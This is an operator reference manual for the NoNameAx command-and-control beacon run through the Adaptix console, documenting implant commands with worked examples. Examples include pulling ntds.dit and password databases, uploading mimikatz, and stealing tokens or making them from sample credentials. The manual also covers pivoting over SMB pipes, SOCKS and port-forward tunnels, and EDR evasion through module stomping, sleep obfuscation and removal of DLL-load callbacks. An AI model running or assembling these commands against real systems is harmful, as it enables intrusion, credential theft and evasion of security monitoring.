# Operator Reference

Quick-reference for all NoNameAx (NaX) beacon commands available in the Adaptix operator console.

---

## Command Summary

| Command | ID | Category | Description |
|---------|----|----------|-------------|
| `whoami` | `0x10` | Recon | Current Windows identity |
| `sleep` | `0x11` | Config | Set callback interval and jitter |
| `terminate thread` | `0x12` | Session | Exit beacon thread only |
| `terminate process` | `0x13` | Session | Kill entire host process |
| `cd` | `0x14` | Navigation | Change working directory |
| `pwd` | `0x15` | Navigation | Print working directory |
| `mkdir` | `0x16` | File Ops | Create directory |
| `rmdir` | `0x17` | File Ops | Remove directory (`-rf` for recursive) |
| `cat` | `0x18` | File Ops | Read file contents |
| `ls` | `0x19` | Navigation | List directory contents (`-r` for recursive tree) |
| `bof` | `0x20` | Execution | Execute a Beacon Object File |
| `execute bof` | `0x20` | Execution | Execute BOF (Extension-Kit compatible) |
| `screenshot` | `0x21` | Recon | GDI desktop capture |
| `download` | `0x22` | File Ops | Download file from target |
| `ps list` | `0x23` | Process | List running processes |
| `ps kill` | `0x24` | Process | Terminate process by PID |
| `ps run` | `0x25` | Process | Run a new program |
| `upload` | `0x26` | File Ops | Upload file to target |
| `rm` | `0x27` | File Ops | Delete file or directory (`-rf` for recursive) |
| `job list` | `0x28` | Execution | List active async BOF jobs |
| `job kill` | `0x29` | Execution | Kill an async BOF job |
| `watchdog` | `0x2C` | Config | Toggle job watchdog on/off at runtime |
| `token getuid` | `0x50` | Token | Current effective identity |
| `token steal` | `0x51` | Token | Duplicate token from a running process |
| `token use` | `0x52` | Token | Impersonate a stored token by ID |
| `token list` | `0x53` | Token | List all tokens in the store |
| `token rm` | `0x54` | Token | Remove a token from the store |
| `token revert` | `0x55` | Token | Drop impersonation, revert to process token |
| `token make` | `0x56` | Token | Create token from credentials |
| `token privs` | `0x57` | Token | List privileges on the current token |
| `profile` | `0x30` | Config | Update malleable C2 profile at runtime |
| `bof-stomp` | `0x31` | Config | Reconfigure BOF module stomping |
| `sleepmask-set` | `0x32` | Config | Rebuild and send sleepmask BOF to agent |
| `sleepobf-config` | `0x33` | Config | Configure sleep obfuscation at runtime |
| `chunksize` | `0x34` | Config | Set download chunk size on agent |
| `dll-notify list` | `0x3A` | Evasion | List DLL load notification callbacks |
| `dll-notify remove` | `0x3B` | Evasion | Remove all DLL load notification callbacks |
| `link smb` | `0x38` | Pivoting | Connect to child beacon's named pipe |
| `unlink` | `0x39` | Pivoting | Disconnect a linked child beacon |
| `socks start` | -- | Tunneling | Start SOCKS4/5 proxy |
| `socks stop` | -- | Tunneling | Stop SOCKS proxy |
| `lportfwd` | -- | Tunneling | Local port forwarding (via Adaptix UI) |
| `rportfwd` | -- | Tunneling | Reverse port forwarding (via Adaptix UI) |

---

## Navigation

### cd

Change the beacon's working directory. All relative paths in subsequent commands resolve from this directory.

```
cd <path>
```

```
cd C:\Users\Public\Documents
cd ..\Downloads
```

### pwd

Print the beacon's current working directory.

```
pwd
```

### ls

List the contents of a directory. Defaults to the current working directory if no path is given. Output is a structured table rendered by the Adaptix UI.

```
ls [-r] [path]
```

```
ls
ls C:\Windows\Temp
ls -r C:\Users\admin\Desktop
```

When `-r` is used, the listing is recursive and rendered as a tree with Unicode box-drawing characters:

```
C:\Users\admin\Desktop
├─ Documents/
│   ├─ report.docx
│   └─ notes.txt
├─ Tools/
│   └─ nc.exe
└─ README.txt
```

Recursion depth is capped at 16 levels. Directories are shown with a trailing `/`.

---

## File Operations

### cat

Read and display the contents of a file. Best suited for text files; for binaries, use `download`.

```
cat <file>
```

```
cat C:\Users\admin\Desktop\notes.txt
cat ..\..\flag.txt
```

### rm

Delete a file or directory. With `-rf`, recursively deletes directories and forces removal of read-only files.

```
rm [-rf] <path>
```

```
rm C:\Temp\payload.exe
rm -rf C:\Temp\staging
```

### mkdir

Create a new directory. Parent directories must already exist.

```
mkdir <path>
```

```
mkdir C:\Temp\staging
```

### rmdir

Remove a directory. Without `-rf`, the directory must be empty. With `-rf`, recursively deletes all contents including read-only files.

```
rmdir [-rf] <path>
```

```
rmdir C:\Temp\staging
rmdir -rf C:\Temp\staging
```

### download

Download a file from the target machine to the operator. The file appears in the Adaptix Downloads tab. Files are transferred in a single tagged frame (filename + contents).

```
download <remote_path>
```

```
download C:\Users\admin\Desktop\secrets.kdbx
download C:\Windows\NTDS\ntds.dit
```

On failure, the beacon returns the Win32 error code (e.g., `ERROR_FILE_NOT_FOUND`, `ERROR_ACCESS_DENIED`).

### upload

Upload a file from the operator machine to a path on the target. The Adaptix UI opens a file picker for the local file.

```
upload <local_file> <remote_path>
```

```
upload /opt/tools/mimikatz.exe C:\Temp\m.exe
```

---

## Process Operations

### ps list

Enumerate all running processes. Output is a tree view with the following columns:

| Column | Description |
|--------|-------------|
| PID | Process ID |
| PPID | Parent process ID |
| Arch | x86 or x64 (via `ProcessWow64Information`) |
| Session | Terminal Services session ID |
| User | `DOMAIN\username` (via token query) |
| Elevated | Whether the process token is elevated |
| Name | Executable name |

```
ps list
```

The process browser can also be opened from the right-click context menu on a session.

### ps kill

Terminate a process by PID. Uses `NtOpenProcess` + `NtTerminateProcess`.

```
ps kill <pid>
```

```
ps kill 4832
```

### ps run

Launch a new process via `CreateProcessA`. The process is created with `CREATE_NO_WINDOW` and `SW_HIDE` by default.

```
ps run [-s] [-o] [-i] <program> [args]
```

| Flag | Description |
|------|-------------|
| `-s` | Create the process suspended (`CREATE_SUSPENDED`). Useful for process injection -- the PID is returned before the process runs. |
| `-o` | Capture stdout/stderr and return output to the operator. Waits up to 10 seconds for the process to finish. Cannot combine with `-s`. |
| `-i` | Reserved for future use (impersonation token). |

```
ps run cmd.exe /c dir C:\Users
ps run -o cmd.exe /c whoami /all
ps run -s notepad.exe
ps run -s -o cmd.exe /c ipconfig /all
```

When `-o` is used without `-s`, the beacon creates an anonymous pipe, attaches it to the child's stdout/stderr, waits for the process to exit (10s timeout), and reads all available output.

When `-s` is used, the process is created suspended and the PID is returned. No output capture occurs in suspended mode, even if `-o` is also specified.

---

## Recon

### whoami

Return the current Windows identity in `DOMAIN\username` format via `GetUserNameW` (ADVAPI32).

```
whoami
```

### screenshot

Capture the primary desktop using GDI (`BitBlt`) and return the image as a BMP. The screenshot appears in the Adaptix Screenshots tab.

```
screenshot
```

---

## Token Operations

NaX supports Windows access token manipulation for impersonation and lateral movement. See [Token Commands](Token-Commands.md) for full wire format details.

### token getuid

Return the current effective identity. Shows the impersonated user if impersonating, otherwise the process token user.

```
token getuid
```

### token steal

Duplicate a token from a target process. Optionally impersonate it immediately.

```
token steal <pid> [impersonate]
```

```
token steal 4832
token steal 4832 true
```

### token use

Impersonate a previously stored token by its numeric ID.

```
token use <token_id>
```

```
token use 1
```

### token list

List all tokens currently in the store (ID, Handle, User, Domain).

```
token list
```

### token rm

Remove a token from the store and close its handle.

```
token rm <token_id>
```

### token revert

Drop impersonation and revert to the process token.

```
token revert
```

### token make

Create a new token from plaintext credentials. Supports multiple logon types.

```
token make [-t <type>] <domain> <username> <password>
```

| Type | Description |
|------|-------------|
| `interactive` | Full logon, token shows actual user |
| `network` | Network-only logon |
| `network_cleartext` | Network with credential delegation (Kerberos double-hop) |
| `new_credentials` | (Default) Network-only credentials, local SID unchanged |

```
token make sevenkingdoms.local cersei.lannister il0vejaime
token make -t interactive CORP admin P@ssw0rd!
```

### token privs

List all privileges on the current effective token (Privilege Name, Enabled/Disabled).

```
token privs
```

---

## BOF Execution

NaX supports Beacon Object File (COFF .o) execution in two modes: synchronous (blocks the beacon thread) and asynchronous (runs in a thread pool worker).

### Direct BOF

The `bof` command uploads and executes a COFF object file.

```
bof <file.o> [args]
```

Args are specified as comma-separated `type:value` pairs:

```
bof /path/to/enum_users.x64.o str:CORP,int:1
```

### Extension-Kit BOF (execute bof)

The `execute bof` syntax is compatible with Adaptix Extension-Kit scripts. The AxScript PreHook handles argument packing via `ax.bof_pack()`.

```
execute bof [-a] [-t <seconds>] <file.o> [packed_args]
```

| Flag | Description |
|------|-------------|
| `-a` | Run asynchronously in the beacon's thread pool |
| `-t <n>` | Watchdog timeout in seconds (default: 60). The job is killed if it exceeds this. Only meaningful with `-a`. |

```
execute bof /opt/bofs/whoami.x64.o
execute bof -a /opt/bofs/portscan.x64.o <packed_hex>
execute bof -a -t 120 /opt/bofs/kerb_enum.x64.o <packed_hex>
```

### BOF Argument Pack Types

When Extension-Kit scripts call `ax.bof_pack()`, these type specifiers are available:

| Type | Description |
|------|-------------|
| `bytes` | Raw byte buffer |
| `int` | 32-bit integer (little-endian) |
| `short` | 16-bit integer (little-endian) |
| `cstr` | ANSI string (null-terminated) |
| `wstr` | Wide string (UTF-16LE, null-terminated) |

### BOF Output

BOF results include a module stomping status prefix:

- `[stomp: chakra.dll]` -- BOF was executed from image-backed memory (the named DLL's .text section)
- `[stomp: private fallback]` -- stomping was unavailable; BOF ran from a private allocation

BOFs can produce text output, screenshots (via `BeaconOutput`-style APIs), and file downloads, all multiplexed into a single compound result frame.

### Sync vs Async

**Sync** (`bof` or `execute bof` without `-a`): The BOF runs on the beacon's main thread. The beacon blocks until the BOF returns. Use for fast, reliable operations.

**Async** (`execute bof -a`): The BOF runs in a thread pool worker. The beacon continues its heartbeat loop and collects results on subsequent check-ins. Use for long-running BOFs (port scans, Kerberos enumeration). Manage running jobs with `job list` and `job kill`.

---

## Job Management

Async BOFs run as background jobs. These commands manage them.

### job list

List all active async BOF jobs, showing task ID and status.

```
job list
```

### job kill

Kill a running async BOF job by its task ID.

```
job kill <task_id>
```

```
job kill a1b2c3d4
```

The task ID is the hex identifier shown by `job list` and in the task output when the async BOF was queued.

### watchdog

Toggle the async BOF watchdog timer at runtime. When enabled (default), jobs that exceed their timeout are automatically killed. Disabling allows long-running BOFs to run indefinitely.

```
watchdog on
watchdog off
```

When the watchdog is disabled, async BOFs will never be killed by timeout — only manual `job kill` will stop them. Re-enabling the watchdog applies to all future jobs; already-running jobs retain their original timeout.

---

## SMB Pivoting

NaX supports parent-child beacon chaining over SMB named pipes. A parent HTTP beacon connects to a child SMB beacon's pipe, and all C2 traffic for the child routes through the parent's HTTP channel.

### link smb

Connect to a child beacon's named pipe on a target host.

```
link smb <target> <pipename>
```

| Argument | Description |
|----------|-------------|
| `target` | Hostname or IP of the machine running the SMB beacon |
| `pipename` | Pipe name the child beacon is listening on (without the `\\.\pipe\` prefix) |

```
link smb DC01 naxsmb
link smb 10.0.0.5 naxsmb
```

On success, the parent reads the child's initial registration beat from the pipe and forwards it to the teamserver. The child then appears as a linked agent in the Adaptix UI.

### unlink

Disconnect a linked child beacon. The child stops receiving tasks and the pipe is closed. The child's heartbeat loop will eventually timeout on the pipe and exit gracefully.

```
unlink <pivot_id>
```

```
unlink a1b2c3d4
```

The pivot ID is the hex value shown when the link was established.

### How Pivoting Works

1. An SMB beacon is deployed on the target and listens on its named pipe.
2. The operator runs `link smb <host> <pipe>` on the parent HTTP beacon.
3. The parent opens the pipe with `CreateFileA` in overlapped mode and reads the child's registration frame.
4. The teamserver registers the child as a linked agent.
5. On each heartbeat, the parent runs `NaxProcessPivots` to poll all linked pipes for pending data and forward it to the teamserver.
6. Tasks for the child are delivered to the parent via `CMD_PIVOT_EXEC`, which writes them to the child's pipe.

---

## TCP Tunneling

NaX supports local and reverse port forwarding through the Adaptix tunnel system. Tunnels are managed from the Adaptix UI (right-click agent > Access > Tunnels), not via beacon console commands.

### Local Port Forwarding (lportfwd)

The teamserver listens on a local port. Connections are relayed through the beacon to a target host/port on the internal network.

```
Operator tool -> server:lport -> beacon -> target:tport
```

1. In the Adaptix UI, right-click the agent and select **Access > Tunnels**
2. Create a new **Local Port Forward**
3. Specify the local listen port, target host, and target port
4. Start the tunnel

Example: forward local port 445 through the beacon to `10.0.0.5:445`, then run `netexec smb localhost` to access the remote SMB service.

### Reverse Port Forwarding (rportfwd)

The beacon listens on a port on the target machine. Remote connections are relayed back through the C2 to an operator-specified destination.

```
Remote client -> beacon:lport -> server -> operator target:tport
```

1. Create a new **Reverse Port Forward** in the tunnel UI
2. Specify the remote listen port, and the local target host/port
3. Start the tunnel

The beacon binds to `127.0.0.1` only (loopback) for OPSEC -- it does not bind `0.0.0.0`.

### SOCKS Proxy

Start a SOCKS4 or SOCKS5 proxy server on the teamserver. All TCP connections through the proxy are relayed through the beacon to the target network. The Adaptix server handles the SOCKS protocol handshake; the beacon only sees standard TCP tunnel commands.

```
socks start [-h <address>] <port> [-socks4] [-auth <username> <password>]
socks stop <port>
```

| Argument | Description |
|----------|-------------|
| `-h <address>` | Listening interface (default: `0.0.0.0`) |
| `port` | Listen port |
| `-socks4` | Use SOCKS4 instead of SOCKS5 |
| `-auth` | Enable username/password auth (SOCKS5 only) |
| `username` | Auth username (required with `-auth`) |
| `password` | Auth password (required with `-auth`) |

```
socks start 1080                        # SOCKS5, no auth, 0.0.0.0:1080
socks start -h 127.0.0.1 9050          # SOCKS5, loopback only
socks start 1080 -socks4               # SOCKS4
socks start 1080 -auth operator s3cret  # SOCKS5 with credentials
socks stop 1080                         # Stop proxy
```

Configure proxychains to use the proxy:

```bash
echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf
proxychains nmap -sT -p 445 10.0.0.0/24
proxychains netexec smb 10.0.0.5 -u admin -p Password1
```

### Transport Support

Tunnels work on both HTTP and SMB transports:

- **HTTP beacon**: Tunnel data is sent/received as part of the regular heartbeat cycle. At sleep 0, tunnels operate at network speed.
- **SMB beacon (linked)**: Tunnel data flows through the parent agent's pipe. The parent relays tunnel tasks and results alongside regular pivot traffic. Tunnel polling runs at 100ms intervals.

### OPSEC Notes

- `ws2_32.dll` is loaded lazily on the first tunnel command -- never imported statically
- All sockets are non-blocking (`FIONBIO`)
- rportfwd binds loopback only (`127.0.0.1`)
- Flow control prevents memory exhaustion: PAUSE at 4MB output, RESUME at 1MB, force close at 16MB

---

## Configuration

### sleep

Set the beacon's callback interval and optional jitter percentage.

```
sleep <seconds> [jitter%]
```

| Argument | Description |
|----------|-------------|
| `seconds` | Callback interval in seconds |
| `jitter%` | Random variance added to each sleep cycle (0-100). Optional, defaults to 0. |

```
sleep 60
sleep 60 30
sleep 5 0
```

Jitter introduces randomness to avoid periodic beacon detection. With `sleep 60 30`, the actual interval on each cycle is randomly chosen between 42 and 78 seconds (60 +/- 30%).

The jitter value is clamped to a maximum of 100%.

### profile

Update the beacon's malleable C2 profile at runtime without regenerating the payload. The operator selects a JSON profile file from their local machine; the AxScript PreHook base64-encodes it and sends it to the beacon.

```
profile <json_file>
```

```
profile /opt/NaX/profiles/jquery-stealth.json
```

When a profile is applied:

1. The beacon parses the new profile and reconfigures its HTTP headers, URIs, and encoding pipeline.
2. The listener is also updated (via `TsExtenderData`) so it can decode the new traffic format.
3. All subsequent heartbeats and results use the new profile.

Profile files follow the same JSON schema as `profiles/*.json` in the NaX repository. This command is only available on HTTP beacons (disabled for SMB transport).

### bof-stomp

Reconfigure BOF module stomping at runtime. BOF stomping loads BOF code into a sacrificial DLL's `.text` section (image-backed memory) instead of a private allocation, evading executable-private-memory detection.

#### bof-stomp show

Display the current stomping configuration: enabled/disabled status, sync DLL name and `.text` capacity, and async DLL pool with slot usage.

```
bof-stomp show
```

Example output:

```
BOF Stomping: enabled
Sync DLL: chakra.dll (.text cap=1245184)
Async DLLs: 3
  [0] jscript9.dll (.text cap=892928)
  [1] mshtml.dll (.text cap=2097152)
  [2] d3d11.dll (.text cap=524288)
```

#### bof-stomp sync

Replace the DLL used for synchronous BOF execution. The beacon unloads the current DLL and loads the new one with `LoadLibraryExW(DONT_RESOLVE_DLL_REFERENCES)`.

```
bof-stomp sync <dll_name>
```

```
bof-stomp sync mshtml.dll
bof-stomp sync mstscax.dll
```

#### bof-stomp async

Replace the entire async DLL pool. Existing idle slots are unloaded; in-use slots are preserved until the BOF completes. The new DLLs are loaded and added to the pool.

```
bof-stomp async <dll1,dll2,...>
```

```
bof-stomp async jscript9.dll,mshtml.dll,d3d11.dll,chakra.dll
```

Each DLL in the pool provides one async execution slot. More DLLs means more concurrent async BOFs.

### sleepmask-set

Rebuild the sleepmask BOF from source and send it to the agent. The beacon loads the new BOF via `NaxBofLoadResident` (module-stomped into the dedicated SmSlot DLL), unwires the old gate, and rewires all BeaconGate function pointers to route through the new `sleep_mask()` entry point.

This lets you iterate on sleepmask logic (e.g., adding debug prints, changing wait behavior) without recompiling or redeploying the beacon. The server runs `make clean && make` in `src_sleepmask/` on every invocation, so any source changes you make are picked up automatically.

```
sleepmask-set [-debug]
```

| Flag | Description |
|------|-------------|
| `-debug` | Build with `-DDEBUG` so the sleepmask BOF emits `NaxDbg` prints |

```
sleepmask-set              # rebuild release, send to agent
sleepmask-set -debug       # rebuild with debug output, send to agent
```

The beacon must have been built with BeaconGate enabled for the gate wrappers to exist. Sending a sleepmask BOF to a beacon built without BeaconGate will load the BOF but never call it (no gate wrappers to route through).

### sleepobf-config

Toggle sleep obfuscation at runtime. When enabled, the sleepmask BOF intercepts Sleep calls via BeaconGate and replaces them with `NtWaitForSingleObject` on a dummy event.

```
sleepobf-config {sleep_obf}
```

| Argument | Values | Description |
|----------|--------|-------------|
| `sleep_obf` | `on` / `off` | Enable or disable sleep obfuscation |

```
sleepobf-config on        # enable WFSO sleep obfuscation
sleepobf-config off       # disable, use plain Sleep()
```

Changes take effect on the next sleep cycle.

### chunksize

Set the download chunk size on the agent. Controls how much data the beacon sends per heartbeat cycle during file downloads. Larger chunks mean fewer round-trips but larger POST bodies.

```
chunksize {size}
```

Size accepts human-readable units: `512KB`, `1MB`, `2MB`, or raw byte counts. Minimum 4KB, maximum 4MB.

```
chunksize 2MB
chunksize 512KB
chunksize 1048576
```

### dll-notify

Manage DLL load notification callbacks registered via `LdrRegisterDllNotification`. EDR products register these callbacks to monitor DLL loading in every process. NaX automatically removes all callbacks at startup (when built with `NAX_UNHOOK_DLL_NOTIFY`), but these commands let you inspect and re-remove callbacks at runtime (e.g., if an EDR re-registers after initial unhooking).

#### dll-notify list

List all currently registered DLL notification callbacks.

```
dll-notify list
```

#### dll-notify remove

Remove all registered DLL notification callbacks.

```
dll-notify remove
```

---

## Session Termination

### terminate thread

Exit only the beacon thread via `RtlExitUserThread`. The host process remains alive. Use this for clean disengagement when the beacon was injected into a legitimate process.

```
terminate thread
```

No result is returned (the thread exits immediately before sending a response).

### terminate process

Kill the entire host process via `ExitProcess`. This is a hard stop -- all threads in the process are terminated.

```
terminate process
```

No result is returned. Also available from the right-click context menu on a session.

---

## Generation UI Options

When generating a new NaX beacon in the Adaptix UI, the following options are presented:

| Option | Default | Notes |
|--------|---------|-------|
| Callback Host | `192.168.77.128` | C2 server IP/hostname (HTTP only) |
| Callback Port | `8080` | C2 server port (HTTP only) |
| Sleep (seconds) | `10` | Initial callback interval (HTTP only) |
| Jitter (%) | `0` | Initial jitter percentage (HTTP only) |
| Module stomping | Enabled | Load beacon into image-backed memory |
| Stomp DLL | `chakra.dll` | Sacrificial DLL for loader module stomping |
| Unwind (.pdata) | Enabled | Stomp `.pdata` for valid stack walks |
| Thread pool | Enabled | Use `TppWorkerThread` as start address |
| BOF stomping | Enabled | Image-backed BOF `.text` execution |
| BOF sync DLL | `chakra.dll` | DLL for synchronous BOF stomping |
| BOF async DLLs | `jscript9.dll`, `mshtml.dll`, `d3d11.dll` | Pool for async BOF stomping |
| Debug | Disabled | Enable `DPRINT` output (visible in DebugView) |
| Full rebuild | Enabled | Clean + recompile all sources |

HTTP-specific options (sleep, jitter, callback host/port) are hidden for SMB beacon generation.

---

## Error Handling

Most commands return a status byte:

| Status | Code | Meaning |
|--------|------|---------|
| OK | `0x00` | Command succeeded |
| ERR | `0x01` | Command failed -- result data may contain a Win32 error code |
| ASYNC | `0x10` | Async job queued -- results delivered on future check-ins |

When a command fails, the Adaptix UI displays the Win32 error name when possible (e.g., `ERROR_FILE_NOT_FOUND`, `ERROR_ACCESS_DENIED`).

---

## Wire Protocol Reference

For developers extending NaX, command IDs are defined in `src_beacon/include/Wire.h` and must stay in sync with:

- `src_server/agent_nonameax/pl_wire.go` (Go constants)
- `src_server/agent_nonameax/pl_commands.go` (command packing)
- `src_server/agent_nonameax/ax_config.axs` (AxScript registration)

New commands follow this pattern:

1. Define `NAX_CMD_YOURNAME` in `Wire.h`
2. Implement `CmdYourName()` in `src_beacon/src/Commands/YourName.c`
3. Add the `case` to `Dispatch.c`
4. Register in `ax_config.axs` and handle in `pl_commands.go`
